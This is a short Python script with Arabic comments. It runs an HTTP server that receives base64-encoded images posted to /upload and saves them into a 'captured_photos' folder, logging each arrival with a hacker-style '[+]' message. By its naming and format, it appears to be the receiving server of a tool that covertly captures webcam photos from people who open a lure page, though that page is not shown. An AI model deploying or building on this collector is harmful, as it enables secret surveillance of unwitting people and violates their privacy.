import http.server
import socketserver
import json
import base64
import os
from datetime import datetime

PORT = 8000
IMAGE_DIR = "captured_photos"

if not os.path.exists(IMAGE_DIR):
    os.makedirs(IMAGE_DIR)

class PhotoReceiverHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/upload':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # استخراج بيانات الصورة وحفظها
            image_data = data['image'].split(',')[1]
            binary_data = base64.b64decode(image_data)
            
            filename = f"{IMAGE_DIR}/photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            with open(filename, 'wb') as f:
                f.write(binary_data)
                
            print(f"[+] تم استلام صورة جديدة وحفظها في: {filename}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
        else:
            self.send_error(404)

print(f"الخادم يعمل على المنفذ {PORT}...")
with socketserver.TCPServer(("", PORT), PhotoReceiverHandler) as httpd:
    httpd.serve_forever()
